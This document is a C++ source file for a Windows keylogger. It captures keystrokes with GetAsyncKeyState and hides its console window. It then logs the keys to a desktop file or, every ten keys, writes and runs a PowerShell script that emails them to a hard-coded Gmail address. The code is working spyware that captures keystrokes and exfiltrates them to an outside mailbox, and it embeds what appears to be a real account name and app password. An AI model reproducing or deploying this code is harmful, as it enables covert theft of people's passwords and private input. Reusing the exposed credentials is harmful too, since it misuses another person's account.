#include <bits/stdc++.h>
#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include "sp.h"

using namespace std;





bool isCapsLock() { // Check if CapsLock is toggled
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) // If the low-order bit is 1, the key is toggled
        return true;
    else
        return false;
}
bool isShift() {  // Check if shift is pressed
    if ((GetKeyState(VK_SHIFT) & 0x8000) != 0) // If the high-order bit is 1, the key is down; otherwise, it is up.
        return true;
    else
        return false;
}

void keylogerwith_file (){
	while (true){
		for (int i = 8  ; i <= 199 ; i++ ){ // ASCII Chart 
			if (GetAsyncKeyState(i) & 0x0001){ 
				if (SpecialKeys(i) == false){
					if (i >= 65 && i <= 90) { // A-Z
                    if (!(isShift() && isCapsLock())){ // Check if the letter should be lower case
                    i += 32;  // in ascii table A=65, a=97. 97-65 = 32
                    }
					}
						fstream file_1 ; 
	                    file_1.open("C:\\Users\\user\\Desktop\\dat.txt" , ios::app) ; 
	                   if (file_1.is_open()){
						//cout << (char) i << " " ; 
		               file_1<< (char)i << " " ; 
		              file_1.close() ; 


				}

			}
            
		}
	}
    }
    }




// just simple timer 
void timer(){
	cout << 6 ; 
	Sleep(1000) ;
	cout << "\n" ;  
	cout << 5 ; 
	Sleep(1000) ;
	cout << "\n" ; 
	cout << 4 ; 
	Sleep(1000) ;
	cout << "\n" ; 
	cout << 3 ; 
	Sleep(1000) ;
	cout << "\n" ; 
	cout << 2 ; 
	Sleep(1000) ;
	cout << "\n" ; 
	cout << 1 ; 
	Sleep(1000) ; 


}



void sendmial(char* input  ){ // send email using powershell https://www.makeuseof.com/tag/send-email-windows-powershell/
	fstream file_1 ; 
	file_1.open("C:\\Users\\user\\Desktop\\KeyLogger.ps1" , ios::app) ;
	file_1<<"$EmailTo=\"asembata12@gmail.com\"\n";
    file_1<<"$EmailFrom=\"facebook@gmail.com\"\n" ;
    file_1<<"$Subject=\"KEYLOGGER\"\n";
    file_1<<"$Body="<< "\"" << input << "\"\n" ; 
    file_1<<"$SMTPServer=\"smtp.gmail.com\"\n";
    file_1<<"$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)\n";
    file_1<<"$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n";
	file_1<<"$SMTPClient.EnableSsl = $true\n";
    file_1<<"$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(\"aloohbata@gmail.com\", \"tlveaxtdpjbklhiw\");\n";
	file_1<<"$SMTPClient.Send($SMTPMessage)";
	file_1.close() ; 
    system("powershell \"C:\\Users\\user\\Desktop\\KeyLogger.ps1");
	remove("C:\\Users\\user\\Desktop\\KeyLogger.ps1") ; 

}
 void save(char i,char* input){

char temp[2]="";
temp[0] = i;
temp[1]='\0';
strcat(input,temp);
}
void emailchoose(){
	while (true){
		int conter = 0 ;
		string x = "sdcsdc" ;  
		char* input=(char*)malloc(100*sizeof(char));
		input[0]='\0' ; 
		for (char i = 8  ; i <= 199 ; i++ ){ // ASCII Chart 
			if (GetAsyncKeyState(i) & 0x0001){ 
				if (SpecialKeys(i) == false){
					conter++ ; 
					save(i,input) ; 
					if (conter == 10 ){
						conter = 0 ;
						sendmial(input) ; 
						free(input); 
						input=(char*)malloc(100*sizeof(char));
						input[0]='\0';
					}

					


				}

			}
		}
		}

}


int main(){
	START:
cout << "THIS IS JUST TEST KEYLOGGER WITH TWO-WAY \n" << " 1 - KEYLOGGER WITH TEXT FILE \n " 
<< "2 - KEYLOGER WITH SEND TO EMAIL \n " ; 
int x ; 
cin >> x ; 
switch (x){

case 1  :
cout << "AFTER 10 SEC THE CONSOL WINDOW WILL HIDE YOU CAN KILL THE PROGRAM FROM END TASK \n " ; 
Sleep(5000) ; 
timer() ; 
FreeConsole(); 
keylogerwith_file() ; 
break;

case 2 :
cout << "AFTER 10 SEC THE CONSOL WINDOW WILL HIDE YOU CAN KILL THE PROGRAM FROM  TASK MANAGER \n " ; 
Sleep(5000) ; 
timer() ;  
FreeConsole();
emailchoose() ; 
break ; 

default:
goto START ; 
	break;
}

 


	return 0;
}
